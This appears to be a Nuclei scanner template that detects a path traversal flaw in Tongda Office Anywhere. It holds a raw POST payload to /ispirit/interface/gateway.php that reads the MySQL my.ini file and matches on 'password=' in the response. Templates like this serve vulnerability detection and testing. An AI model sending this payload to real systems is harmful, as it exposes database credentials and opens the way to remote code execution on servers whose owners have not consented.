id: tongda-path-traversal
info:
  author: pikpikcu
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  description: 'Office Anywhere (OA) is susceptible to path traversal vulnerabilities
    which can be leveraged to perform remote code execution.

    '
  name: Office Anywhere TongDa - Path Traversal
  reference:
  - https://github.com/jas502n/OA-tongda-RCE
  severity: critical
  tags: tongda,lfi
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '[mysql]'
    - password=
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /ispirit/interface/gateway.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    json={"url":"/general/../../mysql5/my.ini"}

    '
